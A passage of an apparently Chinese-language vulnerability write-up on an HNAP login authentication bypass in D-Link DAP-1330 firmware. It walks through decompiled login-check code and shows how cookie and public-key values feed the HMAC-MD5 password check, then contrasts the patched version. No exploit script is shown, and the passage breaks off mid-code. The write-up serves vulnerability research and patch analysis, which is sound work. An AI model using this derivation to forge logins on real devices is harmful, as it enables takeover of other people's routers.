class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of D-Link DAP-1330 Wi-Fi range extenders. Authentication is not required to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the handling of HNAP login requests. The issue results from the lack of proper handling of cookies. An attacker can leverage this vulnerability to execute arbitrary code on the router.</span><br></pre></td></tr></table></figure></div><p>漏洞出现在处理 HNAP 请求中，对于 cookie 的处理不恰当可以导致身份验证绕过，攻击者可以访问敏感 API ，篡改管理员账户密码。</p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先去 <a class="link" href="ftp://ftp2.dlink.com/PRODUCTS/DAP-1330/REVA/">ftp://ftp2.dlink.com/PRODUCTS/DAP-1330/REVA/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 下载固件，注意需要下载 v1.01B04 版本固件，因为在最新版中漏洞已经修复。</p><p>根据漏洞描述找不到太多的信息，通过搜索 cookie 字符串，找到了可能是用于处理 login 请求的函数，该函数位于 libhnap.so 共享库中，函数名 check_login_addr，代码如下</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">check_login_addr</span><span class="params">(undefined4 param_1,<span class="type">char</span> *param_2)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> *__s1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  <span class="type">size_t</span> sVar3;</span><br><span class="line">  <span class="type">size_t</span> sVar4;</span><br><span class="line">  <span class="type">uint32_t</span> uVar5;</span><br><span class="line">  <span class="type">uint32_t</span> uVar6;</span><br><span class="line">  <span class="type">uint32_t</span> uVar7;</span><br><span class="line">  <span class="type">uint32_t</span> uVar8;</span><br><span class="line">  <span class="type">time_t</span> local_2c0;</span><br><span class="line">  <span class="type">char</span> *local_2bc;</span><br><span class="line">  <span class="type">int</span> local_2b8;</span><br><span class="line">  <span class="type">char</span> *local_2b4;</span><br><span class="line">  <span class="type">char</span> *local_2b0;</span><br><span class="line">  undefined4 local_2ac;</span><br><span class="line">  undefined2 local_2a8;</span><br><span class="line">  undefined4 local_2a4;</span><br><span class="line">  undefined4 local_2a0;</span><br><span class="line">  undefined2 local_29c;</span><br><span class="line">  undefined local_29a;</span><br><span class="line">  <span class="type">uint32_t</span> local_298;</span><br><span class="line">  <span class="type">uint32_t</span> local_294;</span><br><span class="line">  <span class="type">uint32_t</span> local_290;</span><br><span class="line">  <span class="type">uint32_t</span> local_28c;</span><br><span class="line">  undefined4 local_288;</span><br><span class="line">  undefined4 local_284;</span><br><span class="line">  undefined4 local_280;</span><br><span class="line">  undefined4 local_27c;</span><br><span class="line">  undefined4 local_278;</span><br><span class="line">  undefined local_274;</span><br><span class="line">  undefined4 local_270;</span><br><span class="line">  undefined4 local_26c;</span><br><span class="line">  undefined4 local_268;</span><br><span class="line">  undefined4 local_264;</span><br><span class="line">  undefined4 local_260;</span><br><span class="line">  undefined local_25c;</span><br><span class="line">  <span class="type">char</span> acStack600 [<span class="number">36</span>];</span><br><span class="line">  undefined auStack564 [<span class="number">51</span>];</span><br><span class="line">  <span class="type">char</span> local_201;</span><br><span class="line">  undefined local_200;</span><br><span class="line">  <span class="type">char</span> local_1ff;</span><br><span class="line">  undefined auStack495 [<span class="number">67</span>];</span><br><span class="line">  <span class="type">char</span> acStack428 [<span class="number">88</span>];</span><br><span class="line">  <span class="type">char</span> acStack340 [<span class="number">40</span>];</span><br><span class="line">  undefined local_12c;</span><br><span class="line">  <span class="type">char</span> acStack299 [<span class="number">6</span>];</span><br><span class="line">  <span class="type">char</span> acStack293 [<span class="number">21</span>];</span><br><span class="line">  <span class="type">char</span> acStack272 [<span class="number">11</span>];</span><br><span class="line">  <span class="type">char</span> acStack261 [<span class="number">21</span>];</span><br><span class="line">  <span class="type">char</span> acStack240 [<span class="number">40</span>];</span><br><span class="line">  <span class="type">time_t</span> local_c8;</span><br><span class="line">  <span class="type">char</span> acStack196 [<span class="number">50</span>];</span><br><span class="line">  <span class="type">char</span> acStack146 [<span class="number">106</span>];</span><br><span class="line">  </span><br><span class="line">  local_2bc = (<span class="type">char</span> *)<span class="number">0x0</span>;</span><br><span class="line">  local_2b8 = <span class="number">0</span>;</span><br><span class="line">  local_2b4 = (<span class="type">char</span> *)<span class="number">0x0</span>;</span><br><span class="line">  local_2b0 = (<span class="type">char</span> *)<span class="number">0x0</span>;</span><br><span class="line">  iVar1 = getElementValue(param_1,<span class="string">&quot;Action&quot;</span>,&amp;local_2bc);</span><br><span class="line">  __s1 = local_2bc;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">1</span> &lt; iVar1) &#123;</span><br><span class="line">    iVar1 = strcasecmp(local_2bc,<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      print_hnap_result(<span class="number">1</span>);</span><br><span class="line">      local_284 = <span class="number">0</span>;</span><br><span class="line">      local_280 = <span class="number">0</span>;</span><br><span class="line">      local_27c = <span class="number">0</span>;</span><br><span class="line">      local_278 = <span class="number">0</span>;</span><br><span class="line">      local_274 = <span class="number">0</span>;</span><br><span class="line">      local_288 = <span class="number">0</span>;</span><br><span class="line">      generate_random_str(&amp;local_288,<span class="number">0x14</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&lt;Challenge&gt;%s&lt;/Challenge&gt;&quot;</span>,&amp;local_288);</span><br><span class="line">      local_2a4 = <span class="number">0</span>;</span><br><span class="line">      local_2a0 = <span class="number">0</span>;</span><br><span class="line">      local_29c = <span class="number">0</span>;</span><br><span class="line">      local_29a = <span class="number">0</span>;</span><br><span class="line">      __s1 = getenv(<span class="string">&quot;Cookie&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (__s1 != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">        __s1 = getenv(<span class="string">&quot;Cookie&quot;</span>);</span><br><span class="line">        splite_cookie(__s1,&amp;local_2a4);</span><br><span class="line">        iVar1 = isExpireCookie(&amp;local_2a4,param_2);</span><br><span class="line">        <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) <span class="keyword">goto</span> LAB_00017320;</span><br><span class="line">      &#125;</span><br><span class="line">      generate_random_str(&amp;local_2a4,<span class="number">10</span>);</span><br><span class="line">LAB_00017320:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&lt;Cookie&gt;%s&lt;/Cookie&gt;&quot;</span>,&amp;local_2a4);</span><br><span class="line">      local_270 = <span class="number">0</span>;</span><br><span class="line">      local_26c = <span class="number">0</span>;</span><br><span class="line">      local_268 = <span class="number">0</span>;</span><br><span class="line">      local_264 = <span class="number">0</span>;</span><br><span class="line">      local_260 = <span class="number">0</span>;</span><br><span class="line">      local_25c = <span class="number">0</span>;</span><br><span class="line">      generate_random_str(&amp;local_270,<span class="number">0x14</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&lt;PublicKey&gt;%s&lt;/PublicKey&gt;&quot;</span>,&amp;local_270);</span><br><span class="line">      local_2ac = <span class="number">0</span>;</span><br><span class="line">      local_2a8 = <span class="number">0</span>;</span><br><span class="line">      genAuthImg(&amp;local_2ac,<span class="number">5</span>);</span><br><span class="line">      <span class="built_in">memset</span>(acStack340,<span class="number">0</span>,<span class="number">0x90</span>);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack340,param_2);</span><br><span class="line">      local_12c = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack299,(<span class="type">char</span> *)&amp;local_2ac);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack293,(<span class="type">char</span> *)&amp;local_288);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack272,(<span class="type">char</span> *)&amp;local_2a4);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack261,(<span class="type">char</span> *)&amp;local_270);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack240,<span class="string">&quot;&quot;</span>);</span><br><span class="line">      uVar2 = setLoginInfo(acStack340);</span><br><span class="line">      removeTimeoutLoginInfo();</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = strcasecmp(__s1,<span class="string">&quot;login&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (iVar1 = getElementValue(param_1,<span class="string">&quot;Username&quot;</span>,&amp;local_2b8), <span class="number">1</span> &lt; iVar1)) &#123;</span><br><span class="line">      <span class="built_in">memset</span>(acStack196,<span class="number">0</span>,<span class="number">0x96</span>);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack196,<span class="string">&quot;UserName&quot;</span>);</span><br><span class="line">      __s1 = (<span class="type">char</span> *)<span class="built_in">tolower</span>(local_2b8);</span><br><span class="line">      <span class="built_in">strcpy</span>(acStack146,__s1);</span><br><span class="line">      <span class="built_in">memset</span>(&amp;local_200,<span class="number">0</span>,<span class="number">0x52</span>);</span><br><span class="line">      getDeviceSecurity(&amp;local_200,acStack196,<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (local_1ff == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        print_hnap_result(<span class="number">3</span>);</span><br><span class="line">        __s1 = getenv(<span class="string">&quot;Cookie&quot;</span>);</span><br><span class="line">        splite_cookie(__s1,acStack272);</span><br><span class="line">        <span class="keyword">goto</span> LAB_0001792c;</span><br><span class="line">      &#125;</span><br><span class="line">      __s1 = getenv(<span class="string">&quot;Cookie&quot;</span>);</span><br><span class="line">      iVar1 = getLoginInfo(__s1,acStack340);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">1</span>) &#123;</span><br><span class="line">        uVar2 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LAB_0001794c;</span><br><span class="line">      &#125;</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(acStack340,param_2);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(auStack564,<span class="number">0</span>,<span class="number">0x34</span>);</span><br><span class="line">        iVar1 = getDeviceSettingsObj(auStack564);</span><br><span class="line">        <span class="keyword">if</span> (iVar1 != <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> iVar1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (local_201 == <span class="string">&#x27;\x01&#x27;</span>) &#123;</span><br><span class="line">          getElementValue(param_1,<span class="string">&quot;Captcha&quot;</span>,&amp;local_2b0);</span><br><span class="line">          iVar1 = <span class="built_in">strcmp</span>(acStack299,local_2b0);</span><br><span class="line">          <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">            print_hnap_result(<span class="number">3</span>);</span><br><span class="line">            __s1 = getenv(<span class="string">&quot;Cookie&quot;</span>);</span><br><span class="line">            splite_cookie(__s1,acStack272);</span><br><span class="line">            iVar1 = removeLoginInfo(acStack340);</span><br><span class="line">            <span class="keyword">if</span> (iVar1 != <span class="number">1</span>) <span class="keyword">goto</span> LAB_00017940;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        iVar1 = getElementValue(param_1,<span class="string">&quot;LoginPassword&quot;</span>,&amp;local_2b4);</span><br><span class="line">        <span class="keyword">if</span> (iVar1 &lt; <span class="number">2</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(acStack428,<span class="number">0</span>,<span class="number">0x55</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(acStack428,<span class="string">&quot;%s%s&quot;</span>,acStack261,auStack495);</span><br><span class="line">        local_294 = <span class="number">0</span>;</span><br><span class="line">        local_290 = <span class="number">0</span>;</span><br><span class="line">        local_28c = <span class="number">0</span>;</span><br><span class="line">        local_298 = <span class="number">0</span>;</span><br><span class="line">        sVar3 = <span class="built_in">strlen</span>(acStack293);</span><br><span class="line">        sVar4 = <span class="built_in">strlen</span>(acStack428);</span><br><span class="line">        hmac_md5(acStack293,sVar3,acStack428,sVar4,&amp;local_298);</span><br><span class="line">        uVar5 = htonl(local_298);</span><br><span class="line">        uVar6 = htonl(local_294);</span><br><span class="line">        uVar7 = htonl(local_290);</span><br><span class="line">        uVar8 = htonl(local_28c);</span><br><span class="line">        <span class="built_in">sprintf</span>(acStack240,<span class="string">&quot;%08X%08X%08X%08X&quot;</span>,uVar5,uVar6,uVar7,uVar8);</span><br><span class="line">        local_294 = <span class="number">0</span>;</span><br><span class="line">        local_290 = <span class="number">0</span>;</span><br><span class="line">        local_28c = <span class="number">0</span>;</span><br><span class="line">        local_298 = <span class="number">0</span>;</span><br><span class="line">        sVar3 = <span class="built_in">strlen</span>(acStack293);</span><br><span class="line">        sVar4 = <span class="built_in">strlen</span>(acStack240);</span><br><span class="line">        hmac_md5(acStack293,sVar3,acStack240,sVar4,&amp;local_298);</span><br><span class="line">        <span class="built_in">memset</span>(acStack600,<span class="number">0</span>,<span class="number">0x21</span>);</span><br><span class="line">        uVar5 = htonl(local_298);</span><br><span class="line">        uVar6 = htonl(local_294);</span><br><span class="line">        uVar7 = htonl(local_290);</span><br><span class="line">        uVar8 = htonl(local_28c);</span><br><span class="line">        <span class="built_in">sprintf</span>(acStack600,<span class="string">&quot;%08X%08X%08X%08X&quot;</span>,uVar5,uVar6,uVar7,uVar8);</span><br><span class="line">        iVar1 = <span class="built_in">strcmp</span>(local_2b4,acStack600);</span><br><span class="line">        <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">          local_12c = local_200;</span><br><span class="line">          time(&amp;local_2c0);</span><br><span class="line">          local_c8 = local_2c0;</span><br><span class="line">          iVar1 = setLoginInfo(acStack340);</span><br><span class="line">          uVar2 = <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">if</span> (iVar1 == <span class="number">1</span>) <span class="keyword">goto</span> LAB_0001794c;</span><br><span class="line">        &#125;</span><br><span class="line">        print_hnap_result(<span class="number">3</span>);</span><br><span class="line">LAB_0001792c:</span><br><span class="line">        uVar2 = removeLoginInfo(acStack340);</span><br><span class="line">        <span class="keyword">return</span> uVar2;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LAB_00017940:</span><br><span class="line">  uVar2 = <span class="number">3</span>;</span><br><span class="line">  iVar1 = <span class="number">0</span>;</span><br><span class="line">LAB_0001794c:</span><br><span class="line">  print_hnap_result(uVar2);</span><br><span class="line">  <span class="keyword">return</span> iVar1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>参考另一篇分析文章： <a href="https://wzt.ac.cn/2021/01/17/DCS-960L/">https://wzt.ac.cn/2021/01/17/DCS-960L/</a></p><p>本漏洞成因和 ZDI-CAN-11352 相同，添加注释的代码如下</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">        <span class="keyword">if</span> ( v44[<span class="number">51</span>] != <span class="number">1</span></span><br><span class="line">          || (getElementValue(a1, <span class="string">&quot;Captcha&quot;</span>, &amp;v29), !<span class="built_in">strcmp</span>(&amp;v47[<span class="number">10</span>] + <span class="number">1</span>, v29))</span><br><span class="line">          || (print_hnap_result(<span class="number">3</span>), v9 = getenv(<span class="string">&quot;Cookie&quot;</span>), splite_cookie(v9, &amp;v47[<span class="number">17</span>]), removeLoginInfo(v47) == <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( getElementValue(a1, <span class="string">&quot;LoginPassword&quot;</span>, &amp;v28) &lt; <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">return</span> v6;</span><br><span class="line">          <span class="built_in">memset</span>(v46, <span class="number">0</span>, <span class="number">85</span>);</span><br><span class="line">          <span class="built_in">sprintf</span>(v46, <span class="string">&quot;%s%s&quot;</span>, &amp;v47[<span class="number">19</span>] + <span class="number">3</span>, &amp;v45[<span class="number">17</span>]);<span class="comment">// key = public key + cookie</span></span><br><span class="line">          v36 = <span class="number">0</span>;</span><br><span class="line">          v37 = <span class="number">0</span>;</span><br><span class="line">          v38 = <span class="number">0</span>;</span><br><span class="line">          v35 = <span class="number">0</span>;</span><br><span class="line">          v10 = <span class="built_in">strlen</span>(&amp;v47[<span class="number">11</span>] + <span class="number">3</span>);</span><br><span class="line">          v11 = <span class="built_in">strlen</span>(v46);</span><br><span class="line">          hmac_md5(&amp;v47[<span class="number">11</span>] + <span class="number">3</span>, v10, v46, v11, &amp;v35);<span class="comment">// private_key = hmac_md5(challenge, chalenge_len, key, key_len)</span></span><br><span class="line">          v12 = htonl(v35);</span><br><span class="line">          v13 = htonl(v36);</span><br><span class="line">          v15 = htonl(v37);</span><br><span class="line">          v14 = htonl(v38);</span><br><span class="line">          <span class="built_in">sprintf</span>(&amp;v47[<span class="number">25</span>], <span class="string">&quot;%08X%08X%08X%08X&quot;</span>, v12, v13, v15, v14);</span><br><span class="line">          v36 = <span class="number">0</span>;</span><br><span class="line">          v37 = <span class="number">0</span>;</span><br><span class="line">          v38 = <span class="number">0</span>;</span><br><span class="line">          v35 = <span class="number">0</span>;</span><br><span class="line">          v17 = <span class="built_in">strlen</span>(&amp;v47[<span class="number">11</span>] + <span class="number">3</span>);</span><br><span class="line">          v16 = <span class="built_in">strlen</span>(&amp;v47[<span class="number">25</span>]);</span><br><span class="line">          hmac_md5(&amp;v47[<span class="number">11</span>] + <span class="number">3</span>, v17, &amp;v47[<span class="number">25</span>], v16, &amp;v35);<span class="comment">// login_password = hmac_md5(challenge, chalenge_len, private_key, private_key_len)</span></span><br><span class="line">          <span class="built_in">memset</span>(v43, <span class="number">0</span>, <span class="number">33</span>);</span><br><span class="line">          v18 = htonl(v35);</span><br><span class="line">          v19 = htonl(v36);</span><br><span class="line">          v21 = htonl(v37);</span><br><span class="line">          v20 = htonl(v38);</span><br><span class="line">          <span class="built_in">sprintf</span>(v43, <span class="string">&quot;%08X%08X%08X%08X&quot;</span>, v18, v19, v21, v20);</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v28, v43)                 <span class="comment">// strcmp(given_login_password, login_password)</span></span><br><span class="line">            || (HIBYTE(v47[<span class="number">10</span>]) = v45[<span class="number">0</span>], time(&amp;v25), v47[<span class="number">35</span>] = v25, v6 = setLoginInfo(v47), v22 = <span class="number">4</span>, v6 != <span class="number">1</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            print_hnap_result(<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">return</span> removeLoginInfo(v47);</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_24:</span><br><span class="line">          print_hnap_result(v22);</span><br><span class="line">          <span class="keyword">return</span> v6;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>验证密码的时候会获取 cookie 中的某个字段，然后按照以下算法</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = public key + cookie</span><br><span class="line">private_key = hmac_md5(challenge, chalenge_len, key, key_len)</span><br><span class="line">login_password = hmac_md5(challenge, chalenge_len, private_key, private_key_len)</span><br></pre></td></tr></table></figure></div><p>计算得到 login_password。静态分析来看，cookie 和 LoginPassword 参数都是用户从外部传递的，这样就能控制最后计算得到的 login_password 结果，可以构造特殊的登录请求来绕过登录。</p><p>新版本中代码片段如下</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v43[<span class="number">51</span>] != <span class="number">1</span></span><br><span class="line">  || (getElementValue(a1, <span class="string">&quot;Captcha&quot;</span>, &amp;v28), !<span class="built_in">strcmp</span>(&amp;v46[<span class="number">10</span>] + <span class="number">1</span>, v28))</span><br><span class="line">  || (print_hnap_result(<span class="number">3</span>), v14 = getenv(<span class="string">&quot;Cookie&quot;</span>), splite_cookie(v14, &amp;v46[<span class="number">17</span>]), removeLoginInfo(v46) == <span class="number">1</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( getElementValue(a1, <span class="string">&quot;LoginPassword&quot;</span>, &amp;v27) &lt; <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> v12;</span><br><span class="line">  v35 = <span class="number">0</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="built_in">strlen</span>(&amp;v46[<span class="number">11</span>] + <span class="number">3</span>);</span><br><span class="line">  v16 = <span class="built_in">strlen</span>(&amp;v46[<span class="number">25</span>]);</span><br><span class="line">  hmac_md5(&amp;v46[<span class="number">11</span>] + <span class="number">3</span>, v15, &amp;v46[<span class="number">25</span>], v16, &amp;v34);</span><br><span class="line">  <span class="built_in">memset</span>(v42, <span class="number">0</span>, <span class="number">33</span>);</span><br><span class="line">  v17 = htonl(v34);</span><br><span class="line">  v18 = htonl(v35);</span><br><span class="line">  v20 = htonl(v36);</span><br><span class="line">  v19 = htonl(v37);</span><br><span class="line">  <span class="built_in">sprintf</span>(v42, <span class="string">&quot;%08X%08X%08X%08X&quot;</span>, v17, v18, v20, v19);</span><br></pre></td></tr></table></figure></div><p>hmac_md5 的 key 被设置成 &amp;v46[25]，观察 setLoginInfo 函数片段</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        v2(&amp;v13[<span class="number">900</span>], <span class="string">&quot;PrivateKey&quot;</span>);</span><br><span class="line">        v4 = &amp;v13[<span class="number">950</span>];</span><br><span class="line">        v5 = v46 + <span class="number">100</span>;</span><br><span class="line">LABEL_10:</span><br><span class="line">        <span class="built_in">strcpy</span>(v4, v5);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br></pre></td></tr></table></figure></div><p>v46 + 100 转换成索引形式就是 v46[25]，它被定义成 PrivateKey。再来看 getLoginInfo 片段</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">        <span class="keyword">if</span> ( strcasecmp(v4 + v8 + <span class="number">8</span>, <span class="string">&quot;PrivateKey&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( strcasecmp(v4 + v8 + <span class="number">8</span>, <span class="string">&quot;TimeStamp&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( 